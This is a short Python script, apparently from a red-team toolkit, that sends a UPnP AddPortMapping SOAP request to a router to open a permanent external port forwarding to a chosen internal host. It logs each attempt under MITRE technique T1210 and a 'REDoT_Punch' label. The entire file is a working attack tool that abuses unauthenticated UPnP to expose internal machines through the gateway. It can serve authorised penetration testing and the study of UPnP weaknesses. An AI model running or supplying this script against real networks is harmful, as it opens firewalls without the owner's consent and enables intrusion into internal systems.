
import argparse
import requests
from xml.etree import ElementTree as ET
from datetime import datetime
import json
import os

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1210"  # Exploitation of Remote Services

def log_event(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def add_port_mapping(control_url, external_port, internal_ip, internal_port, protocol="TCP"):
    soap_body = f"""
    <?xml version="1.0"?>
    <s:Envelope
        xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
        s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
        <s:Body>
            <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
                <NewRemoteHost></NewRemoteHost>
                <NewExternalPort>{external_port}</NewExternalPort>
                <NewProtocol>{protocol}</NewProtocol>
                <NewInternalPort>{internal_port}</NewInternalPort>
                <NewInternalClient>{internal_ip}</NewInternalClient>
                <NewEnabled>1</NewEnabled>
                <NewPortMappingDescription>REDoT_Punch</NewPortMappingDescription>
                <NewLeaseDuration>0</NewLeaseDuration>
            </u:AddPortMapping>
        </s:Body>
    </s:Envelope>
    """

    headers = {
        "SOAPAction": "\"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"",
        "Content-Type": "text/xml"
    }

    response = requests.post(control_url, data=soap_body.strip(), headers=headers, timeout=5)

    log_event({
        "timestamp": datetime.utcnow().isoformat(),
        "control_url": control_url,
        "external_port": external_port,
        "internal_ip": internal_ip,
        "internal_port": internal_port,
        "protocol": protocol,
        "ttp": MITRE_TTP,
        "success": response.status_code == 200
    })

    if response.status_code == 200:
        print(f"[âœ“] Port {external_port} -> {internal_ip}:{internal_port} mapped via UPnP")
    else:
        print(f"[!] Failed to punch port: {response.status_code}")
        print(response.text)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="UPnP Port Puncher")
    parser.add_argument("--control-url", required=True, help="UPnP control URL (e.g., http://192.168.1.1:1900/control)")
    parser.add_argument("--ext-port", required=True, type=int, help="External port to open")
    parser.add_argument("--int-ip", required=True, help="Internal IP to forward to")
    parser.add_argument("--int-port", required=True, type=int, help="Internal port")
    parser.add_argument("--proto", default="TCP", choices=["TCP", "UDP"])
    args = parser.parse_args()

    add_port_mapping(args.control_url, args.ext_port, args.int_ip, args.int_port, args.proto)
